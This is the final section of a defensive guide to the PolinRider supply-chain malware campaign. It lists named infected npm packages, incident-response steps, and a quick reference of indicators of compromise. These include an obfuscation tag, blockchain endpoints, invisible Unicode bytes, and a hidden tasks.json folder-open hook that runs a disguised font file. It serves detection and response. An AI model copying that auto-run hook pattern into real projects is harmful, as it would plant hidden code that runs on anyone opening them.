What This Guide Does Not Cover
A complete treatment of everything adjacent to this topic would require a book. It is worth briefly naming the areas that are out of scope here so you know where the edges are.
npm package registry compromise. PolinRider also infected npm packages directly - not just GitHub repositories. If you have @aifabrix/miso-client, @iflow-mcp/watercrawl-watercrawl-mcp, or any @usebioerhold8733/* package in your dependency tree, you have a separate problem that requires checking your node_modules against the OSM published IOC list and running npm audit.
Consumer and downstream notification. If your repository is public and was compromised, anyone who cloned or forked it during the compromise window may have the payload. The security-advisories command in Part 3 creates a public advisory, but you should also go to your GitHub fork network (Repository → Insights → Forks) and look for any forks made during the compromise window.
Windows and Linux workstation hardening. This guide focused on macOS for the sandbox-exec material. On Linux, firejail or bubblewrap serve the same role. On Windows, Windows Sandbox and Hyper-V containers are the equivalent. The git hook and CI pipeline material is fully cross-platform.
Incident reporting. If you are in a regulated industry, a supply chain compromise of this severity likely triggers breach notification obligations. The DPRK attribution is confirmed by multiple research teams. Document your forensic timeline using the snapshot tarballs from the batch clean script and consult with your legal team.

---

Quick Reference Card
Have I been compromised? Look for: a VS Code extension installed after a recruiter interaction or "take-home test"; global['_V']='8-' in any file; processes named node that you did not start; missing ~/.gitconfig (it may have been read and exfiltrated); binary-extension files in your project that file reports as text/javascript.
What to do right now: Kill VS Code. Revoke all GitHub tokens and SSH keys from a clean device. Do not run git pull or npm install from the infected machine. Create a forensic mirror clone before making any changes.
The six-layer defence: pre-open content scan (Part 4) → hardware-backed SSH keys (Part 2) → per-repo deploy keys (Part 2) → sandbox-exec wrapping all npm/node invocations (Part 2) → global git hooks (Part 3) → protected CI Actions workflow (Part 3).
IOC quick reference: PolinRider V2 tag global['_V']='8-st*', blockchain endpoints trongrid.io / aptoslabs.com / bsc-dataseed, invisible Unicode byte sequences E2 80 8B / EF B8 80, large author/committer date gaps in git log, binary-extension files with text/javascript content type (font vector), tasks.json with runOn:folderOpen + hide:true + node ./path/to/binary.woff2.
Key design principles for ongoing defence:
Extension is a trust model, not a security model - always verify content type against extension.
Patterns should be structural, not literal - flexible regex outlives specific obfuscation.
Payload rules should have no filename restriction - the font vector proved extension-based filtering creates blind spots.
Every new disguise format (.wasm, .css, .svg) is just the extension list changing, not the threat changing. The entropy and magic-byte checks remain valid.

---

All code in this guide is provided for defensive and educational purposes. The YARA rules, Python scripts, shell scripts, and sandbox profiles may be used freely without attribution. The IOC patterns are based on research published openly by the OpenSourceMalware team. The font-file vector analysis and extended scanning tools extend the original detection tooling to address the confirmed gap. Stay curious, stay paranoid, and always check the byte layer.
